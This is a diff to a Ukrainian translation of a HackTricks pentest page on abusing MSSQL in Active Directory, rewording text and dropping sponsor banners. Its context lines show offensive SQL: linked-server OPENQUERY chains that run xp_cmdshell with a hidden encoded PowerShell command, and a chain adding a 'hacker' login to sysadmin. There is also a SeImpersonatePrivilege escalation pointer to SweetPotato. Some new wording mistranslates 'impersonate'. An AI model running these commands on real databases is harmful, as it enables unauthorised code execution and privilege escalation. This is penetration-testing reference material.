@@ -1,12 +1,9 @@
-# MSSQL AD Abuse
+# MSSQL AD Зловживання
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
-{% embed url="https://websec.nl/" %}
-
-## **MSSQL Enumeration / Discovery**
+## **MSSQL Перерахунок / Виявлення**
 
 ### Python
 
@@ -235,7 +232,7 @@ select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 
 ![](<../../images/image (643).png>)
 
-Ви можете вручну продовжувати цей ланцюг довірених посилань вічно.
+Ви можете продовжувати цей ланцюг довірених посилань вічно вручну.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -255,14 +252,10 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 ```
 ## Підвищення локальних привілеїв
 
-**MSSQL локальний користувач** зазвичай має спеціальний тип привілею, званий **`SeImpersonatePrivilege`**. Це дозволяє обліковому запису "вдаватись під клієнта після аутентифікації".
+**MSSQL локальний користувач** зазвичай має спеціальний тип привілею, званий **`SeImpersonatePrivilege`**. Це дозволяє обліковому запису "імплементувати клієнта після аутентифікації".
 
-Стратегія, яку розробили багато авторів, полягає в тому, щоб змусити службу SYSTEM аутентифікуватись до зловмисної або атаки "людина посередині" служби, яку створює зловмисник. Ця зловмисна служба потім може вдаватися під службу SYSTEM, поки вона намагається аутентифікуватись.
+Стратегія, яку розробили багато авторів, полягає в тому, щоб змусити службу SYSTEM аутентифікуватися до зловмисної або атаки "людина посередині" служби, яку створює зловмисник. Ця зловмисна служба потім може імплементувати службу SYSTEM під час спроби аутентифікації.
 
-[SweetPotato](https://github.com/CCob/SweetPotato) має колекцію цих різних технік, які можна виконати за допомогою команди `execute-assembly` Beacon.
-
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://websec.nl/" %}
+[SweetPotato](https://github.com/CCob/SweetPotato) має колекцію цих різних технік, які можна виконати за допомогою команди `execute-assembly` Beacon. 
 
 {{#include ../../banners/hacktricks-training.md}}
